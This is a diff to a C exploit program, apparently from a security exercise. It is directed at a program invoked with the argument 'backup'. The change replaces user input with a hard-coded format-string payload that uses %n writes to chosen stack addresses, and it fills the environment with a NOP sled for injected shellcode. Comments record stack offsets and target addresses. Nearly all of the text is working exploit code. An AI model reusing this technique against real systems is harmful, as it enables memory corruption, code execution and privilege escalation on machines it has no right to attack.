@@ -17,12 +17,14 @@ int main(int argc, char **argv)
 	*/
 	
 	/*"\xea\xdc\xbf\xff\xee\xdc\xbf\xff"*/ /*8 characters written*/
-	/*args[0] = "AAAA%101$x";*/			/*Writes AA at addres 0xffbfdcee*/
 	
-	args[0] = argv[1];
-			
-			  
-			  
+	/*BBBBBBBB is found on the 10th and 11th item off the printf stack*/
+	
+	/*args[0] = "\x8c\xdc\xbf\xff\x8e\xdc\xbf\xff%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"; */		/*Writes AA at addres 0xffbfdcee*/ 
+	args[0] = " \xcc\xdc\xbf\xff\xce\xdc\xbf\xff%57200c%10$n%8255c%11$n";			/*Writes AA at addres 0xffbfdcee*/ 
+
+	/*%17468c%10$n%11$n*/
+			    
 	args[1] = "backup";
 	args[2] = NULL; args[3] = NULL;
 	env[0] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" /* NOP Sled first 40 char*/
